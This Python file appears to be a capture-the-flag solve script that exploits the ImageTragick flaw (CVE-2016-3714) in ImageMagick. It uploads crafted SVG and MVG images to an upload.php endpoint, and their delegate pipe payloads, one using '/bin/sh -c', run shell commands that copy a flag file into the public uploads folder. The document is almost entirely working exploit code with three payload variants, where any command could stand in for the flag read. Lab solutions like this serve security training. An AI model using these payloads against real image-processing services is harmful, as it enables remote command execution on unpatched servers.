#!/usr/bin/env python3
"""
WEB-02 Solve Script: ImageTragick RCE (CVE-2016-3714)
Uploads a crafted SVG that exploits ImageMagick's delegate processing
to execute arbitrary commands when `convert` generates a thumbnail.
"""

import requests
import sys
import re
import time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8002"

print(f"[*] Target: {TARGET}")

# ── Step 1: Craft ImageTragick SVG exploit ──
print("\n[*] Step 1: Crafting ImageTragick SVG payload...")

# This SVG exploits CVE-2016-3714 via the delegate mechanism
# When ImageMagick processes this, it executes the embedded command
exploit_svg = '''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://example.com/x.jpg"|cat /var/www/flags/web02/flag.txt > /var/www/html/uploads/flag_output.txt"'
pop graphic-context
'''

print(f"[+] SVG payload crafted ({len(exploit_svg)} bytes)")

# ── Step 2: Upload exploit SVG ──
print("\n[*] Step 2: Uploading exploit SVG...")

files = {
    'image': ('exploit.svg', exploit_svg.encode(), 'image/svg+xml')
}

r = requests.post(f"{TARGET}/upload.php", files=files, allow_redirects=False)
print(f"[+] Upload response: {r.status_code}")

# Wait for ImageMagick processing
time.sleep(2)

# ── Step 3: Check for flag output ──
print("\n[*] Step 3: Checking for command output...")

try:
    r = requests.get(f"{TARGET}/uploads/flag_output.txt", timeout=5)
    if 'FLAG{' in r.text:
        flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)
        if flag_match:
            print(f"\n[+] FLAG CAPTURED: {flag_match.group(1)}")
            sys.exit(0)
except:
    pass

# ── Alternative: Try MVG format ──
print("\n[*] Trying alternative MVG payload...")

mvg_payload = 'push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 \'ephemeral:|cat /var/www/flags/web02/flag.txt > /var/www/html/uploads/flag_output2.txt\'\npop graphic-context\n'

files = {
    'image': ('exploit.mvg', mvg_payload.encode(), 'image/svg+xml')
}

r = requests.post(f"{TARGET}/upload.php", files=files, allow_redirects=False)
time.sleep(2)

try:
    r = requests.get(f"{TARGET}/uploads/flag_output2.txt", timeout=5)
    if 'FLAG{' in r.text:
        flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)
        if flag_match:
            print(f"\n[+] FLAG CAPTURED: {flag_match.group(1)}")
            sys.exit(0)
except:
    pass

# ── Alternative: pipe-based ──
print("\n[*] Trying pipe-based payload...")

pipe_svg = '''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.jpg"|/bin/sh -c "cat /var/www/flags/web02/flag.txt > /var/www/html/uploads/pwned.txt"'
pop graphic-context
'''

files = {
    'image': ('shell.svg', pipe_svg.encode(), 'image/svg+xml')
}

r = requests.post(f"{TARGET}/upload.php", files=files, allow_redirects=False)
time.sleep(2)

try:
    r = requests.get(f"{TARGET}/uploads/pwned.txt", timeout=5)
    if 'FLAG{' in r.text:
        flag_match = re.search(r'(FLAG\{[^}]+\})', r.text)
        if flag_match:
            print(f"\n[+] FLAG CAPTURED: {flag_match.group(1)}")
            sys.exit(0)
except:
    pass

print("\n[-] Automatic exploitation failed. Try manual SVG upload with different payloads.")
print("    Hint: The server uses ImageMagick `convert` for thumbnail generation.")
